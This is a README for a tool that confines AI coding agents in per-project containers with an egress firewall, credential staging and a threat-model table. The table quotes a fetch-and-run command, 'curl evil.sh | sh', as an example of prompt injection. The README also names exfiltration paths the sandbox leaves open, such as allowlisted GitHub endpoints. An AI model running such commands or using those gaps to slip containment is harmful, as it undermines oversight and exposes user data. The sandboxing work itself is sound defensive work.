# project-sandbox

`project-sandbox` runs Claude Code, Codex CLI, OpenCode, or a plain Bash shell inside per-project Linux containers. On macOS, direct CLI runs default to Apple's [`container`](https://github.com/apple/container) runtime, where each container runs in its own VM. On Linux, direct CLI runs support Docker or Podman. The agents are configured to operate freely inside the selected runtime boundary.

The tool generates a derived image with OpenSpec and detected agent CLIs, sanitized agent configs, an egress firewall, and a parallel devcontainer specification so the same sandbox is reachable from the Python CLI or from local devcontainer clients.

## What it does end-to-end

Given `project-sandbox /path/to/repo python:3.12-slim`:

1. Read host `git config --global` identity.
2. Render `<project>/.project-sandbox/` — `Dockerfile` and `Dockerfile.devcontainer`, `entrypoint.sh`, `init-firewall.sh` and `init-firewall-devcontainer.sh`, sanitized `claude/settings.json`, `claude-devcontainer/settings.json`, `codex/config.toml`, `codex-devcontainer/config.toml`, a local `.gitignore` safeguard, and a devcontainer post-start init script. Agent credentials are staged separately under `/tmp` with private directory permissions to reduce the chance of accidentally committing them.
3. Render `<project>/.devcontainer/` with symlinks back into `.project-sandbox/` so the Dockerfile and firewall script remain a single source of truth.
4. Detect available host agent configs (`~/.claude`, `~/.codex`, `~/.config/opencode`) and install only those agent CLIs into the generated Dockerfile. OpenSpec and Bash are always available.
5. Append `.project-sandbox/` and `.devcontainer/` to `<project>/.gitignore` (idempotent).

Given `project-sandbox --agent claude /path/to/repo python:3.12-slim`, it additionally:

1. Select a direct-run runtime: Apple `container` on macOS, or Docker/Podman on Linux.
2. Verify the Apple `container` system service is running when that runtime is selected.
3. Build the image with the selected runtime.
4. The container entrypoint wires Git and jj identity, copies staged credentials into the container's home, then runs the firewall before exec'ing the agent.

## Install

Directly from GitHub:

```bash
uvx --from git+https://github.com/pkrusche/project-sandbox.git project-sandbox --help
```

From a checkout:

```bash
uv sync
uv run project-sandbox --help
```

## Updating pinned dependencies

Pinned package and tool versions are updated with the interactive helper:

```bash
uv run python scripts/update-pins.py
```

The script checks:

- exact PyPI pins in `pyproject.toml`, regenerating `uv.lock` after accepted
  direct dependency updates;
- lockfile-only PyPI package pins in `uv.lock`, updated through
  `uv lock --upgrade-package`;
- global npm tool pins in the generated Dockerfile template;
- pinned Node.js and jj binary releases, including their per-architecture
  SHA256 checksums;
- the pinned `ghcr.io/astral-sh/uv` image tag and digest used by the project
  Dockerfile helpers.

For each changed upstream version, the script asks before editing so individual
updates can be accepted or skipped. After accepting updates, run the usual
verification commands:

```bash
uv run python -m compileall src tests scripts
uv run pytest -q
```

## Quick start

```bash
uv run project-sandbox /absolute/path/to/repo python:3.12-slim
```

To build on top of a repo's existing Dockerfile instead of a base image tag:

```bash
uv run project-sandbox /absolute/path/to/repo --dockerfile /absolute/path/to/repo/Dockerfile
```

In this mode, `.project-sandbox/Dockerfile` starts with the existing Dockerfile contents and appends the sandbox runtime, firewall, OpenSpec, and installed coding agents. The build context defaults to the project root so existing `COPY` instructions keep working; use `--docker-context` if that Dockerfile expects a different context. If the source Dockerfile defines its own non-root user or standalone UID/GID setup, project-sandbox removes those instructions, prints a warning, and creates its own `agent` user with UID 1000. If a `RUN` instruction mixes user-management commands with unrelated build steps, project-sandbox rejects it instead of silently dropping the unrelated work.

### Python + uv projects

For a Python project managed with uv, create a `Dockerfile` at the project root that
installs uv and pre-populates the package cache so the agent can run `uv sync` /
`uv run` inside the sandbox without reaching PyPI (which the firewall blocks at
runtime):

```dockerfile
FROM python:3.11-slim

COPY --from=ghcr.io/astral-sh/uv:0.11.23@sha256:d0a0a753ab981624b49c97abc98821c1c09f4ca69d1ef5cee69c501be3d88479 /uv /usr/local/bin/uv

# Pre-populate the uv package cache with all project dependencies so the agent
# can run `uv sync` / `uv run` inside the sandbox without reaching PyPI.
# UID 1000 is the agent user created by the sandbox layers that follow.
COPY pyproject.toml uv.lock README.md /tmp/project-setup/
COPY src/ /tmp/project-setup/src/
RUN UV_CACHE_DIR=/opt/uv-cache uv sync \
        --frozen \
        --project /tmp/project-setup \
    && chown -R 1000:1000 /opt/uv-cache \
    && rm -rf /tmp/project-setup

ENV UV_CACHE_DIR=/opt/uv-cache
```

Key points:
- Copy all files referenced by `pyproject.toml` metadata (including `README.md` if
  declared as `readme =`) so the build backend can validate the project during the
  cache-warming step.
- The `chown -R 1000:1000` gives the sandbox's `agent` user (UID 1000, created by
  the layers that follow) full access to the pre-warmed cache.
- `ENV UV_CACHE_DIR=/opt/uv-cache` persists into the running container so the agent's
  `uv sync` reads from the cache instead of PyPI.

Then run:

```bash
uv run project-sandbox /absolute/path/to/repo --dockerfile /absolute/path/to/repo/Dockerfile
```

Use `--dry-run` to preview every action without writing files or starting the runtime:

```bash
uv run project-sandbox --dry-run /absolute/path/to/repo python:3.12-slim
```

Direct CLI runs use `--runtime auto` by default. Auto-selection prefers Apple `container` on macOS, and Docker then Podman on Linux. Override it when needed:

```bash
uv run project-sandbox --runtime docker --agent bash /absolute/path/to/repo python:3.12-slim
uv run project-sandbox --runtime podman --agent bash /absolute/path/to/repo python:3.12-slim
uv run project-sandbox --runtime apple-container --agent bash /absolute/path/to/repo python:3.12-slim
```

When `--image-tag` is omitted, the generated image tag is
`project-sandbox-<project-name>-<8-char sha256>:latest`. The project name is
sanitized from the resolved project directory name, and the hash is derived from
the resolved absolute path so two projects with the same directory name do not
collide. Use `--image-tag` when you need a stable external tag, want to share a
prebuilt image, or need to align with local image cleanup scripts.

Generated images install a pinned `@fission-ai/openspec` version, which puts
`openspec` on `PATH`. project-sandbox does not run `openspec init` or create
OpenSpec workspace files automatically; run OpenSpec initialization commands
inside the project only when that project should own those files.

## File layout

```
<project>/
├── .gitignore                       # appended (idempotent): .project-sandbox/ and .devcontainer/
├── .project-sandbox/
│   ├── .gitignore                       # local safeguard; parent .gitignore ignores the whole directory
│   ├── Dockerfile                       # generated (direct CLI runs)
│   ├── Dockerfile.devcontainer          # generated (devcontainer build)
│   ├── entrypoint.sh                    # container PID 1
│   ├── init-firewall.sh                 # iptables/ipset egress allowlist (CLI variant)
│   ├── init-firewall-devcontainer.sh    # firewall variant that also allows the host gateway
│   ├── project-sandbox-devcontainer-init  # devcontainer postStart helper
│   ├── claude/settings.json             # sanitized Claude config (CLI: bypassPermissions)
│   ├── claude-devcontainer/settings.json  # sanitized Claude config (devcontainer: auto)
│   ├── codex/config.toml                # sanitized Codex config (CLI: approval never)
│   ├── codex-devcontainer/config.toml   # sanitized Codex config (devcontainer: on-request)
│   └── sessions/                        # unsupervised-mode logs (gitignored)
└── .devcontainer/
    ├── devcontainer.json                # generated
    ├── Dockerfile              → ../.project-sandbox/Dockerfile.devcontainer
    ├── init-firewall.sh        → ../.project-sandbox/init-firewall-devcontainer.sh
    ├── claude                  → ../.project-sandbox/claude
    ├── claude-devcontainer     → ../.project-sandbox/claude-devcontainer
    ├── codex                   → ../.project-sandbox/codex
    └── codex-devcontainer      → ../.project-sandbox/codex-devcontainer
```

The `.project-sandbox/` and `.devcontainer/` directories are generated local state and are ignored as a whole. Re-run `project-sandbox` after cloning, pulling generated config changes, or refreshing credentials. Agent credential staging lives outside the project under `/tmp/project-sandbox-<uid>/...`.

## Devcontainer flow

Before starting the devcontainer, run `project-sandbox /absolute/path/to/repo python:3.12-slim` once on the host. This refreshes the `/tmp/project-sandbox-<uid>/...` agent credential staging directories that the devcontainer mounts at startup.

Then open the project in VS Code, Cursor, or any devcontainer-aware IDE and choose **Reopen in Container**. The generated `devcontainer.json` builds the same image, mounts the same sanitized configs and staged credentials, runs the same firewall via `postStartCommand`, and waits for it before opening a terminal. Re-run the same `project-sandbox` command before starting or rebuilding the devcontainer again whenever credentials may have changed, `/tmp` may have been cleaned, or you are on a different host.

Generate the devcontainer without building or running anything:

```bash
uv run project-sandbox /absolute/path/to/repo python:3.12-slim
```

This is useful for repos whose owners do not want to run a direct CLI runtime but want the sandboxed agent environment in a local devcontainer-capable IDE. Remote devcontainer services such as Codespaces need additional adaptation because the generated spec uses local `.project-sandbox/` files, absolute host credential staging under `/tmp/project-sandbox-<uid>/...`, and firewall capabilities (`NET_ADMIN`/`NET_RAW`) that may not be available remotely.

## Unsupervised (fire-and-forget) sessions

Run the agent without a TTY, starting from a prompt and writing all output to a log file:

```bash
uv run project-sandbox \
  --prompt /absolute/path/to/prompt.txt \
  /absolute/path/to/repo \
  python:3.12-slim
```

- `--prompt FILE` copies the file into a private generated staging directory,
  bind-mounts only that directory read-only, and reads the prompt from
  `/project-sandbox-prompt/<name>`.
- `--prompt-text "..."` writes the prompt under `.project-sandbox/prompts/`,
  bind-mounts that directory read-only, and reads it from
  `/project-sandbox-prompt/prompt.txt`.
- `--agent {claude,codex,opencode,bash}` selects which agent to run. If omitted, the CLI only initializes generated config files unless a prompt is supplied. Claude, Codex, and OpenCode require their host config directories; Bash is always available.
- `--log FILE` overrides the default log path under `.project-sandbox/sessions/<agent>-main-<timestamp>.log`.
- For headless `claude` runs, a readable markdown transcript is rendered automatically beside the log (same name, `.md` extension) by parsing the stream-json events. This is best-effort: a parse failure prints a warning but never fails the run.
- `--runtime {auto,apple-container,docker,podman}` selects the direct-run backend. `auto` prefers Apple `container` on macOS and Docker then Podman on Linux.
- `--timeout SECONDS` stops the session if the agent runs too long: the container is stopped by name (asking the runtime to send SIGTERM to PID 1, then SIGKILL after a grace period), the CLI process group is also signalled as a fallback, and the CLI returns exit code `124`.
- `--verbose` controls how much is shown on the terminal. By default it is quiet: image build and Apple `container system start` output is suppressed (shown only if they fail), the in-container firewall banner is silenced, interactive runs just print `Starting container…` before handing off to the agent/shell, and headless runs print the log path up front and a `Wrote N lines to …` summary at the end (the full output still goes to the log file). With `--verbose`, the build output streams, the firewall banner shows, and headless output is teed live to the terminal as well as the log.
- The agent's exit code is propagated, so CI pipelines can detect failures.

OpenCode can be configured with multiple providers. The default firewall allows
OpenAI and Anthropic endpoints; use `--allow-github` for GitHub Copilot, or
`--extra-domain DOMAIN` for another provider endpoint.

The generated `.project-sandbox/` directory remains on the host for image builds
and devcontainer setup, but direct runs and devcontainers mask
`/workspace/.project-sandbox` with an empty read-only bind mount. Agents still
receive the generated config, credentials, prompts, and history through their
dedicated mounts, but cannot edit the generated files through the workspace.

Unsupervised sessions skip the interactive `-it` flags and switch dispatch to `<agent>-headless` for all supported agents. Claude runs with `--dangerously-skip-permissions`, Codex uses `approval_policy = "never"`, OpenCode runs via `opencode run`, and Bash runs with `bash -lc`. The container is still the sandbox boundary; review the diff before integrating.

A maliciously crafted file in the workspace (e.g. a prompt-injection in a README) can still steer an unsupervised agent. Use narrow prompts and inspect the diff before merging.

## Network firewall

When the firewall is enabled (default), `init-firewall.sh` runs as root inside the container and:

- Sets `iptables` and `ip6tables` policies to DROP.
- Pre-resolves allowlisted domains using the resolvers in `/etc/resolv.conf`,
  pins the resulting addresses into `/etc/hosts` and `ipset`, then blocks
  general outbound DNS to close DNS-tunnel exfiltration.
- Allows Claude/Anthropic endpoints (`api.anthropic.com`, `claude.ai`, `code.claude.com`, `platform.claude.com`), `api.openai.com`, `auth.openai.com`, and `chatgpt.com`.
- When `--allow-github` is set, also allows GitHub's published web/API/git IP ranges (fetched from `api.github.com/meta`) and DNS-pinned GitHub/Copilot hosts: `github.com`, `api.github.com`, `uploads.github.com`, `codeload.github.com`, `lfs.github.com`, `raw.githubusercontent.com`, `objects.githubusercontent.com`, `github-cloud.githubusercontent.com`, `api.githubcopilot.com`, `api.individual.githubcopilot.com`, `api.business.githubcopilot.com`, `api.enterprise.githubcopilot.com`, `copilot-proxy.githubusercontent.com`, `origin-tracker.githubusercontent.com`, `copilot-telemetry.githubusercontent.com`, and `collector.github.com`.
- In the devcontainer firewall variant only, allows the host gateway address so port-forwarding and IDE attach work. Direct CLI runs omit this host-network allowlist.
- Mirrors the IPv4 allowlist into a parallel IPv6 set; falls back to disabling IPv6 via `sysctl` when `ip6_tables` is unavailable — the script exits with an error if both `ip6tables` and `sysctl` are unavailable.

Domain allowlists are resolved once when the container starts, then pinned as IP
addresses in `ipset`. CDN-backed services can rotate IPs during long sessions; if
an allowlisted service starts failing after it initially worked, restart the
container or devcontainer so the firewall resolves fresh addresses.

Customize:

- `--extra-domain DOMAIN` — append entries to the allowlist (`registry.npmjs.org`, private registries, internal APIs, etc.). Repeatable.
- `--allow-github` — allow GitHub and GitHub Copilot endpoints. This is useful for GitHub-backed workflows, but it also creates a viable exfiltration path through GitHub.
- `--no-firewall` — skip the firewall entirely (trusted-LAN debugging only).

## Threat model

| Threat | Mitigation |
|---|---|
| Agent reads `~/.ssh`, `~/Library`, etc. | Arbitrary host home directories are not mounted by default. Apple `container` adds a VM boundary; Docker/Podman rely on the host's container isolation. |
| Agent deletes the wrong project directory | The workspace, generated config, staged agent credentials, optional `--mount` entries, and worktree-mode `.git` metadata are the intentional host mounts; everything else lives in the disposable container or VM. |
| Agent exfiltrates the workspace to an arbitrary server | iptables egress allowlist (default DROP + domain whitelist) for both IPv4 and IPv6. |
| DNS tunneling exfiltration | Allowlisted domains are pre-resolved at startup and general outbound DNS is blocked afterward. |
| Prompt injection drives `curl evil.sh \| sh` | Blocked unless the C2 host is on the allowlist. |
| Malicious npm post-install scripts | Run as UID 1000 inside the container; no access to unmounted host paths. |
| Agent updates itself to a malicious version | `autoUpdaterStatus: disabled` (Claude) and `disable_update_check = true` (Codex). OpenCode config is not currently sanitized — see TODO. |
| Agent sends telemetry / usage data | `CLAUDE_TELEMETRY_DISABLED=1` (Claude); `analytics.enabled = false` and `feedback.enabled = false` (Codex). OpenCode config is not currently filtered for telemetry settings — see TODO. |
| API token leakage via process environment | Tokens are passed through mounted credential files, not environment variables; host staging files are kept under a private `/tmp` directory. |

The tool does **not** protect against:

- Exfiltration via whitelisted endpoints (e.g. committing secrets to a GitHub repo).
- Misuse of an agent's own API token (it is by definition available to the agent).
- IPv6 egress when `ip6_tables` is unavailable and `sysctl` cannot disable IPv6 (the firewall script exits with an error in that case rather than silently proceeding).

## Troubleshooting

- **No supported runtime found.** Install Apple `container` on macOS, or Docker/Podman on Linux. You can also pass `--runtime docker`, `--runtime podman`, or `--runtime apple-container` explicitly.
- **`container system start` failed.** Make sure macOS 15+ is current and `apple/container` is installed; the tool calls `container system start` idempotently before building when the Apple runtime is selected.
- **Build OOM on Apple `container`.** The builder VM is separate from run VMs. Bump it: `container builder start --memory 8g --cpus 8`, then re-run `project-sandbox`.
- **GitHub meta API timeout.** The firewall script falls back to an empty `{web,api,git,ipv6}` set and starts with a partial allowlist. Re-running the agent later (with the firewall flushed and rebuilt at container start) will retry.
- **`ip6tables` unavailable.** The script attempts `sysctl net.ipv6.conf.all.disable_ipv6=1` first. If that also fails, the script aborts with an error.
- **Credentials look stale.** Re-run `project-sandbox` on the host to refresh the `/tmp` credential staging directory from the host agent config or macOS Keychain.
- **Env vars in `vminitd.log`.** apple/container [logs the full process environment](https://github.com/apple/container/discussions/1153). Tokens are passed through mounted credential files only; identity env vars are low-sensitivity.
- **Rootless Podman firewall setup fails.** The default firewall needs `NET_ADMIN` and `NET_RAW`. Use a Podman setup that permits those capabilities, or pass `--no-firewall` only for trusted-network debugging.

## Limitations

- Base images, including the final stage of a Dockerfile passed with `--dockerfile`, must be Debian or Ubuntu based — the firewall depends on `apt` packages including `aggregate`, which Alpine does not ship.
- Direct Python CLI runs support Apple `container`, Docker, and Podman. Docker/Podman provide container isolation rather than the Apple MicroVM boundary. Incus is a future backend candidate, but it has a different image/import and launch lifecycle from the generated Dockerfile flow used here.
- The generated `.devcontainer/` targets local Docker-compatible runtimes such as Docker Desktop or OrbStack; remote services may require rewriting local mounts and relaxing or replacing firewall capability requirements.
- `--branch` creates an isolated workspace for the agent. In git repos it creates a git worktree on the given branch (creating the branch if it doesn't exist), mounts the worktree at `/workspace`, and bind-mounts the main repo's `.git/` so `git` works correctly inside the container. In jj repos it creates a jj workspace plus bookmark, mounts that workspace at `/workspace`, and bind-mounts the main repo's `.jj/` metadata so `jj` works inside the container. After the session, `--after-session` controls whether to ask interactively (default), merge/rebase back into the main workspace, open a PR, or do nothing. Note: worktree-of-worktree setups are not supported.
- `jj` is installed in the container and configured with the same global name/email identity passed to Git.

## Development

```bash
uv sync
uv run python -m compileall src tests
uv run pytest -q
```

Tests cover CLI surface, runtime selection, dry-run non-mutation, renderer output, container `argv` construction, devcontainer JSON validity and symlinks, gitignore helpers, and Python-native unsupervised-session timeout handling.

A self-contained end-to-end smoke test creates a throwaway hello-world project, runs the tool against it, and validates every generated artefact:

```bash
./scripts/e2e-test.sh                  # portable: devcontainer only path
./scripts/e2e-test.sh --with-container # also exercises direct CLI container runs
```

The test prints the temp project path on success so the generated files can be inspected.

## References

**Prior art and direct inspiration**
- [agentbox (fletchgqc)](https://github.com/fletchgqc/agentbox/tree/main) — ephemeral per-project Docker containers for Claude/OpenCode/Gemini
- [Claude Code devcontainer](https://github.com/anthropics/claude-code/tree/main/.devcontainer) — reference `init-firewall.sh` and devcontainer layout
- [Jarek Hartman: Codex in the jail](https://jhartman.pl/posts/macos/2026-02-02-codex-in-the-jail/) — why `sandbox-exec` falls short and apple/container fills the gap

**Similar projects using apple/container**
- [instavm/coderunner](https://github.com/instavm/coderunner) — MCP-server-based sandbox for Claude Code, Codex, Gemini, OpenCode, Kiro
- [banksean/sand](https://github.com/banksean/sand) — per-project disposable microVMs with APFS CoW workspace cloning
- [emarc/claude-contained](https://github.com/emarc/claude-contained) — minimal wrapper image for Claude Code/Codex/Gemini/Vibe in apple/container or Docker

**Docker/Incus-based alternatives with egress filtering**
- [mattolson/agent-sandbox](https://github.com/mattolson/agent-sandbox) — per-project Docker containers with iptables + mitmproxy allowlist and proxy-injected credentials
- [pvillega/sandbox-claude](https://github.com/pvillega/sandbox-claude) — per-project Incus containers on OrbStack with domain-filtered egress
- [mensfeld/code-on-incus](https://github.com/mensfeld/code-on-incus) — multi-slot Incus sandboxes with real-time network threat detection
- [trailofbits/claude-code-devcontainer](https://github.com/trailofbits/claude-code-devcontainer) — hardened devcontainer for Claude Code with immutable firewall and IPC-socket mitigations

**Worktree-per-agent pattern**
- [dagger/container-use](https://github.com/dagger/container-use) — MCP server that gives agents isolated Docker environments backed by Git branches/worktrees

**Container-free / kernel-enforced sandboxing**
- [anthropic-experimental/sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime) — OS-level filesystem and network restrictions without a container (Bubblewrap/seccomp on Linux, Seatbelt on macOS)
- [Use-Tusk/fence](https://github.com/Use-Tusk/fence) — Go tool for container-free agent sandboxing, inspired by sandbox-runtime
- [GreyhavenHQ/greywall](https://github.com/GreyhavenHQ/greywall) — deny-by-default kernel-syscall sandbox with built-in profiles for 14+ coding agents
